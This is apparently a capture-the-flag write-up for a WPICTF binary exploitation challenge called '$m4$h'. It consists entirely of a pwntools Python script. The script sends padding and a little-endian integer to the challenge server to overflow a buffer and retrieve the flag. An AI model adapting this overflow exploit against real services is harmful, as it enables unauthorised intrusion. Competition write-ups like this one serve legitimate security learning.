# pwn

## $m4$h

> Solved by : thewhiteh4t

```python
#!/usr/bin/env python3

from pwn import *

host = 'smash184384.wpictf.xyz'
port = 15724

junk = 'A' * 11
num = 923992130

le_num = p32(num, endianness='little')
buffer = junk.encode() + le_num + '\n'.encode()

conn = remote(host, port)
conn.send(buffer)
flag = conn.recvline().decode().split(': ')[1].strip()
print(f'\nFLAG : {flag}\n')
conn.close()
```